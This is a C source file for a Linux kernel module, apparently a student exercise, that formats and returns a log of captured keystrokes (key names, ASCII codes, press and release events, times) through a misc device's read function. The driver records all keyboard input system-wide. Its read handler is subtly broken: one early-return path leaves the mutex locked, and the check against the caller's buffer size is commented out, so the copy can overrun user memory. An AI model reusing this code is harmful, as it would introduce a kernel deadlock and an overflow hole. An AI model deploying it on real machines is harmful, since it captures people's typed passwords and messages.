#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/fs.h>

#include "drivers_and_interrupts.h"

size_t calc_node_size(struct linked_list_node *node) {
    size_t size = 14;
    if (node->key.state == PRESSED) {
        size += 7;
    } else {
        size += 8;
    }
    if (node->key.ascii_value) {
        size += 6;
    }
    size += strlen(node->key.key_name);
    node->size = size;
    return size;
}


ssize_t read_keyboard_misc_device(struct file *file, char __user *buf, size_t count, loff_t *ppos) {
    struct linked_list_node *tmp;
    loff_t node_offset = *ppos;

    mutex_lock(&lock);
    list_for_each_entry(tmp, &keyboard_log, list) {
        if (node_offset < tmp->size) {
            break;
        }
        node_offset -= tmp->size;
    }
    if (node_offset > tmp->size) {
        printk("early exit\n");
        return 0;
    }
//    if (count > len - *ppos) {
//        count = len - *ppos;
//    }

    size_t user_offset = 0;
    for (; !list_entry_is_head(tmp, &keyboard_log, list); tmp = list_next_entry(tmp, list)) {
        char sec = (tmp->when.tv_sec - (sys_tz.tz_minuteswest * 60)) % 60;
        char min = (tmp->when.tv_sec - (sys_tz.tz_minuteswest * 60)) / 60 % 60;
        char hour = (tmp->when.tv_sec - (sys_tz.tz_minuteswest * 60)) / 60 / 60 % 24;
        char *buffer = kmalloc(sizeof(char) * tmp->size, GFP_KERNEL);
        if (!buffer) {
            mutex_unlock(&lock);
            return -ENOMEM;
        }
        memset(buffer, 0, tmp->size);
        snprintf(buffer, tmp->size, "%02d:%02d:%02d \"%s\"", hour, min, sec, tmp->key.key_name);
        if (tmp->key.ascii_value) {
            snprintf(buffer + strlen(buffer), tmp->size - strlen(buffer), "(0x%02x) ", tmp->key.ascii_value);
        }
        if (tmp->key.state == PRESSED) {
            snprintf(buffer + strlen(buffer), tmp->size - strlen(buffer), "PRESSED\n");
        } else {
            snprintf(buffer + strlen(buffer), tmp->size - strlen(buffer), "RELEASED\n");
        }

        if (copy_to_user(buf + user_offset, buffer + node_offset, tmp->size - node_offset)) {
            kfree(buffer);
            mutex_unlock(&lock);
            return -EFAULT;
        }
        kfree(buffer);
        user_offset += tmp->size - node_offset;
        node_offset = 0;
    }
    *ppos += (long long)user_offset;
    mutex_unlock(&lock);
    return (long long)user_offset;
}